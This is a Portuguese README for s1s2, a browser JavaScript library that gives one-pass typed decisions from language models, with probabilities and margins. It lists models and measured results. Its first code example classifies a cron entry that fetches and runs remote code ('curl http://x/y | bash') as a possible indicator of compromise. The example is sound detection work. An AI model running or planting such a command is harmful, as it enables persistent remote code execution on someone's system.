# s1s2

[English](README.md)

Decisões tipadas numa só passada de um modelo de linguagem, no navegador, com a probabilidade e a margem de cada resposta. Quando você quer uma explicação, o mesmo modelo gera texto com os mesmos pesos.

```sh
npm i @s1s2/web
```

```js
import { S1S2 } from "@s1s2/web";

const model = await S1S2.load({ manifest: "manifests/ct0-alias3-micro-1026.json" });    // escolhe o runtime do aparelho
const s = await model.decide({
  input: "path: /etc/cron.d/x\ncontent: * * * * * curl http://x/y | bash",
  questions: [{ name: "ioc", type: "predicate", instructions: "Is this an indicator of compromise?" }],
  // evidence: { requirement: "..." },  // pacotes com head de evidência: s.evidence = a frase que mostra
});
const { probability, margin } = s.answers[0];                // P(verdadeiro) e p(1º) - p(2º)
const why = await s.generate("Explain the decision in two sentences.", { maxNewTokens: 96 });  // mesmos pesos
await s.dispose(); await model.dispose();
```

## O que é

- Uma biblioteca JavaScript que responde perguntas `predicate`, `choice` e `score` numa só passada, sem gerar texto. Cada resposta traz `probability`, `confidence`, `margin` e `rawMargin`.
- `s.generate()` continua do mesmo prefill que produziu a decisão, nos backends que guardam estado. No WebGPU esse reuso (e o prefixo comum a várias perguntas) é idêntico bit a bit a um prefill completo: nenhum bloco de prefill tem menos de 32 tokens, porque o onnxruntime-web calcula blocos menores por outro caminho numérico.
- Uma política de margem opcional manda as respostas de margem baixa para outro build do mesmo modelo (por exemplo, de int4 para int8) ou para a geração. Não há limiar padrão: você mede o seu no seu build.
- Runtimes: ONNX Runtime Web (grafos GenAI e decoders comuns), transformers.js, WebLLM e LiteRT.js. No Node, onnxruntime-node.
- Lê **pacotes S1S2**: um manifesto que fixa cada arquivo por sha256 e descreve o layout do prompt, os marcadores, as leituras e os heads. A biblioteca e o formato têm o mesmo nome; o formato está especificado em [`spec/`](spec/s1s2-package.md).
- Formatos de head que lê: Kev `head.pt`, heads de decisão em GGUF, alias3-web `head.bin`, leituras lineares d3/pplx, JEV, `DecisionConfig` do transformers e heads conjuntos Clef. [`converters/heads/`](converters/heads) converte cada um deles e grava um registro de fidelidade contra o código de referência do próprio formato.

## Modelos

Todos num lugar só: a coleção [s1s2 specialists](https://huggingface.co/collections/eduardoworrel/s1s2-specialists-6afc6b0ec797ec2a26933909) no Hugging Face.

Especialistas S1S2 publicados. Os repositórios ONNX rodam no navegador com esta biblioteca (WebGPU); os LoRA trazem o adaptador PyTorch e os heads para servidor. Cada card traz resultados, limites e licença.

| Tarefa | Base | Navegador (ONNX int4, WebGPU) | Servidores (LoRA + heads) |
|---|---|---|---|
| GDPR + LGPD | EuroLLM-1.7B | [EuroLLM-1.7B-GDPR-LGPD-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/EuroLLM-1.7B-GDPR-LGPD-ONNX-genai-int4-S1S2) | [EuroLLM-1.7B-GDPR-LGPD-LoRA](https://huggingface.co/eduardoworrel/EuroLLM-1.7B-GDPR-LGPD-LoRA) |
| GDPR + LGPD | S5-nano | [S5-nano-GDPR-LGPD-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/S5-nano-GDPR-LGPD-ONNX-genai-int4-S1S2) | [S5-nano-GDPR-LGPD-LoRA](https://huggingface.co/eduardoworrel/S5-nano-GDPR-LGPD-LoRA) |
| GDPR + LGPD | Salamandra-2B | [Salamandra-2B-GDPR-LGPD-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/Salamandra-2B-GDPR-LGPD-ONNX-genai-int4-S1S2) | [Salamandra-2B-GDPR-LGPD-LoRA](https://huggingface.co/eduardoworrel/Salamandra-2B-GDPR-LGPD-LoRA) |
| GDPR + LGPD | SmolLM3-3B | [SmolLM3-3B-GDPR-LGPD-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/SmolLM3-3B-GDPR-LGPD-ONNX-genai-int4-S1S2) | [SmolLM3-3B-GDPR-LGPD-LoRA](https://huggingface.co/eduardoworrel/SmolLM3-3B-GDPR-LGPD-LoRA) |
| só LGPD | Jurema-7B (acesso controlado) | [Jurema-7B-LGPD-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/Jurema-7B-LGPD-ONNX-genai-int4-S1S2) | [Jurema-7B-LGPD-LoRA](https://huggingface.co/eduardoworrel/Jurema-7B-LGPD-LoRA) |
| só LGPD | S5-nano | [S5-nano-LGPD-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/S5-nano-LGPD-ONNX-genai-int4-S1S2) | [S5-nano-LGPD-LoRA](https://huggingface.co/eduardoworrel/S5-nano-LGPD-LoRA) |
| só LGPD | SmolLM3-3B | [SmolLM3-3B-LGPD-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/SmolLM3-3B-LGPD-ONNX-genai-int4-S1S2) | [SmolLM3-3B-LGPD-LoRA](https://huggingface.co/eduardoworrel/SmolLM3-3B-LGPD-LoRA) |
| ContractNLI + CLINC150 + SIB-200 | Qwen3-0.6B | [Qwen3-0.6B-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/Qwen3-0.6B-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2) | [Qwen3-0.6B-ContractNLI-CLINC-SIB-LoRA](https://huggingface.co/eduardoworrel/Qwen3-0.6B-ContractNLI-CLINC-SIB-LoRA) |
| ContractNLI + CLINC150 + SIB-200 | Qwen3-1.7B | [Qwen3-1.7B-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/Qwen3-1.7B-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2) | [Qwen3-1.7B-ContractNLI-CLINC-SIB-LoRA](https://huggingface.co/eduardoworrel/Qwen3-1.7B-ContractNLI-CLINC-SIB-LoRA) |
| ContractNLI + CLINC150 + SIB-200 | S5-nano | [S5-nano-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/S5-nano-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2) | [S5-nano-ContractNLI-CLINC-SIB-LoRA](https://huggingface.co/eduardoworrel/S5-nano-ContractNLI-CLINC-SIB-LoRA) |
| ContractNLI + CLINC150 + SIB-200 | SmolLM3-3B | [SmolLM3-3B-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/SmolLM3-3B-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2) | [SmolLM3-3B-ContractNLI-CLINC-SIB-LoRA](https://huggingface.co/eduardoworrel/SmolLM3-3B-ContractNLI-CLINC-SIB-LoRA) |

Fallback para CPU: sem WebGPU, o `S1S2.load` roda no CPU do navegador (onnxruntime-web WASM; `model.device === "wasm"`, desligável com `cpuFallback: false`) os builds cujo manifesto lista o device `"wasm"`: 7,5–16,5× mais lento que WebGPU, mesmas decisões em ≥116/120 itens (120 itens de desenvolvimento por tarefa, Chrome num Apple M2 Pro); entradas longas (ContractNLI) nos modelos de 1,7B e 3B não couberam em 2 horas para 120 itens. O S5-nano não roda lá (sem kernel WASM para GatedDeltaNet).

Início rápido com um pacote publicado:

```js
import { S1S2 } from "@s1s2/web";

const model = await S1S2.load({  // navegador (WebGPU, ou o fallback para CPU acima); ainda sem device para Node
  manifest: "https://huggingface.co/eduardoworrel/Qwen3-0.6B-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2/resolve/main/manifest.cnli.json",
});
const options = model.manifest.lab.options;  // ["Entailment", "Contradiction", "Not mentioned"]
const ndaText = "...";                        // o texto do NDA
const hypothesis = "Receiving Party shall destroy or return some Confidential Information upon the termination of Agreement.";
const s = await model.decide({
  input: "Contract:\n" + ndaText,
  questions: [{ name: "h", type: "choice", choices: options,
    instructions: `Hypothesis: ${hypothesis}\nDoes the contract entail this hypothesis, contradict it, or not mention it? Answer with one option only.` }],
});
const { choice, confidence, margin } = s.answers[0];
await s.dispose(); await model.dispose();
```

Os heads foram treinados com as palavras exatas das opções e da pergunta: use as do manifesto (`lab.options`, `lab.question`, ou `lab.labels` nos pacotes GDPR/LGPD, perguntados como `choice` entre `labels.yes` e `labels.no`). Outras palavras mudam o prompt que o head lê.

## Estado: alfa

O que foi medido. Em cada rodada, as hipóteses, a divisão dos dados e a regra de pontuação foram fixadas antes de rodar, e os testes trancados foram lidos uma vez só.

- A margem aponta as decisões que o int4 troca em relação ao bf16 (8 de 8 cenários).
- Mandar para int8 os 15% de respostas com menor margem pega mais dessas trocas que escolher ao acaso (5 de 6 cenários; não no SmolLM2-135M). Há pouca acurácia em jogo: de −0,1 a +2,7 pontos.
- O ponteiro de evidência acha a frase certa melhor que regras que ignoram o conteúdo (6 de 6 e 4 de 4 cenários). Contra a citação gerada pelo modelo, o resultado é misto: em contratos a citação gerada venceu 3 de 4.
- Nos pesos reais do CT0, `decide()` coincide com o `askMany()` do ct0-edge até 4e-16. Os 172 prompts de teste do ct0-edge são reproduzidos de forma exata.
- Perguntas `score` (notas de 1 a 5: SST-5 em inglês, avaliações da B2W em português; teste trancado, lido uma vez; SmolLM3-3B congelado): o head linear mediu melhor que os logits dos rótulos, erro absoluto médio de 0,49 (en, SST-5) e 0,50 (pt, B2W) níveis contra 0,60 dos logits lidos depois do espaço; lidos logo após `Answer:`, os dígitos tinham ~1e-5 da probabilidade, por isso a leitura de score por logits agora lê depois desse espaço (`logits.score.lead`).
- Cada conversão de formato de head tem registro de fidelidade: [spec §11](spec/s1s2-package.md#11-coverage-formats--conversion--fidelity).

O que não foi medido, ou não se sustentou:

- A decisão numa passada **não** é mais robusta ao int4 que a resposta gerada. Ela também não venceu o JSON com gramática em modelos de até 1,7B.
- Mandar as respostas de margem baixa para a geração foi medido uma vez, de forma exploratória: não ajudou nos itens de leis de privacidade e ajudou em contratos (ContractNLI), mas a tarefa e a divisão dos dados mudaram juntas, então não dá para separar as duas causas.
- O ponteiro de evidência em grafos int4 no navegador foi visto só em dados de desenvolvimento.
- Bytes baixados e latência da escalada não foram medidos. Nenhum tipo de head e nenhuma definição de confiança é recomendada ainda (TBD na spec).
- Alguns pacotes convertidos não rodam no s1s2 0.1: os de atenção não causal, os de templates Jinja e os que leem camadas intermediárias. Os heads Clef são lidos, mas o `decide()` não os usa.

Referência da API e do manifesto: [`docs/reference.md`](docs/reference.md). Padrões e suas evidências: [`docs/system1-on-device-patterns.md`](docs/system1-on-device-patterns.md). Ambos em inglês.

Outros projetos já fazem decisão tipada numa passada, entre eles o open-jev, o exemplo de decisão do wllama, o `tasks-decision` do MediaPipe e o `NonGenerativeSession` do ONNX Runtime GenAI. Mandar entradas de margem baixa para mais precisão já aparece na literatura, por exemplo em arXiv [2609.24322](https://arxiv.org/abs/2609.24322) e [2611.14418](https://arxiv.org/abs/2611.14418).

## Áudio (experimental)

Além de texto, a biblioteca lê um **pacote de áudio** (codificador Qwen3-ASR-0.6B congelado com leituras do Marimba). As respostas são as mesmas (`probability`, `margin`, `rawMargin`), com uma passada para qualquer número de perguntas de áudio.

```js
import { loadMedia } from "@s1s2/web/media";

const audio = await loadMedia({ manifest: "manifests/marimba-audio.json", baseUrls: { "local/marimba-audio-web": new URL("/weights/marimba-audio/", location.href).href }, modules: { ort }, allowUnverified: true });
const d = await audio.decide({ audio: { samples, sampleRate: 16000 }, questions: ["voice_activity", "turn_end", "speaker_change"] });
// d.answers[i].decision / .probability / .margin ; d.cost: { ms, parts: { mel, tower, readers } }

// Com o decodificador: o próprio texto (uma janela de até 8 s; guloso, ou `{ beam: true }` para beam search)
const t = await audio.transcribe({ samples, sampleRate: 16000 }, { maxNewTokens: 256 });
// t.text (sem o prefixo "language"), t.language ("pt" ou null), t.method, t.tokens, t.finishReason, t.cost; com beam: t.hypotheses (quatro, a melhor primeiro)
```

O `transcribe` também aceita o resultado de `audio.encode(...)`, então as perguntas acima e o texto dividem uma passada da torre. Precisa do decodificador (dá erro como `language` e `term` quando ele não está carregado), lê uma janela (sem marcas de tempo, sem streaming) e, com pesos int4, o texto difere da referência em float32 quase tanto quanto as hipóteses do `term` (seção 9.6 da spec).

- Áudio, Chrome WebGPU, 56 janelas FLEURS pt-BR: probabilidades a até 3,82e-5 do pacote Marimba em torch e a mesma decisão em 56 de 56; cerca de 0,2 s por janela (log-mel em JavaScript 116 ms, codificador 71 ms, cinco leituras 10 ms).
- Idioma (30 línguas) e palavra dita em áudio usam o decodificador do Qwen3-ASR quando o manifest o lista (cerca de 0,7 GB a mais; medido só em português). O `loadMedia` o carrega por padrão (`decoder: "auto"`): se não carregar (WebGPU sem memória, servidor sem Range, sem build para o dispositivo) o modelo ainda responde as outras cinco perguntas, `onStatus` e `model.decoder` dizem o motivo, e só uma pergunta `language` ou `term` dá erro; `decoder: false` não carrega nada e `decoder: true` falha se não carregar. O código do idioma coincidiu com a referência torch nas 72 janelas de teste, mas a tolerância de 0,02 na probabilidade **não é cumprida** no clipe de ruído (até 0,09 com pesos int4) nem, por 0,0001, em uma janela de fala ([spec seção 9.5](spec/MULTIMODAL.md)); o int4 também muda o texto da transcrição (só cerca de um quarto das hipóteses de beam são iguais às do torch). O `transcribe` devolve o texto de uma janela; fora do pacote: marcas de tempo, streaming, política de margem para mídia. [`spec/MULTIMODAL.md`](spec/MULTIMODAL.md) traz o desenho, as tolerâncias e todos os limites; o mesmo arquivo lista os pontos em aberto e as licenças lidas nas fontes.
- Os pesos **não estão publicados**: o manifest é `revision: "local"` e a demo aponta para uma pasta local. Demo: [`examples/audio-turn`](examples/audio-turn) (`node examples/serve-media.mjs --weights <pasta>`); como o pacote é feito: [`recipes/`](recipes).

## Estrutura

- [`src/`](src): a biblioteca. `npm test` roda typecheck, build e testes de unidade. Os testes usam mocks e não baixam modelo. Ainda não há CI hospedado: rode `npm test` (e `python -m pytest` em `converter/`) antes de cada versão.
- [`spec/`](spec): a spec do pacote S1S2 (0.2-draft) e o JSON Schema. `node bin/s1s2.mjs validate <pacote>` confere um pacote.
- [`converter/`](converter/README.md): transforma um modelo do Hugging Face e um JSONL rotulado num pacote. Em Python.
- [`converters/heads/`](converters/heads): converte formatos de head publicados em pacotes.
- [`examples/`](examples): um verificador de política de privacidade que roda no aparelho, com o pacote publicado [S5-nano GDPR + LGPD](https://huggingface.co/eduardoworrel/S5-nano-GDPR-LGPD-ONNX-genai-int4-S1S2) (download de 2,4 GB; a CCPA não estava no treino). Rode `node examples/policy-checker/serve.mjs` depois de `npm ci && npm run build`. `?en=<URL do manifesto>&pt=<URL do manifesto>` carrega outro pacote; um build local é servido com `--mirror <repo>=<pasta>`.
- [`manifests/`](manifests): manifestos fixados do CT0 (alias3-micro-1026, builds públicos) e do modelo base SmolLM2-135M. Os builds do SmolLM2 não estão publicados, então esses manifestos só carregam de um espelho desses mesmos arquivos; para gerar um pacote pequeno seu, rode o [`converter/`](converter/README.md) (`s1s2-convert all` escreve o grafo, os heads e o manifesto) e sirva com `serve.mjs --mirror`.

## Créditos

A divisão Sistema 1 / Sistema 2 e a ideia do portão de margem vêm do CT0, da Alias Robotics. Este código nasceu no [ct0-edge](https://github.com/eduardoworrel/ct0-edge).
O head de ponteiro e a receita de treino que o lab seguiu, com o aumento de dados, vêm do [Kev](https://github.com/jaredpalmer/kev) (Apache-2.0); o conversor porta o head, não o aumento de dados. A codificação KEV vem do [open-jev](https://github.com/nico-martin/open-jev) (MIT). Veja [`NOTICE`](NOTICE).

## Licença

MIT ([`LICENSE`](LICENSE)). O código de terceiros mantém a própria licença ([`NOTICE`](NOTICE)). Pesos e heads mantêm a licença da origem.
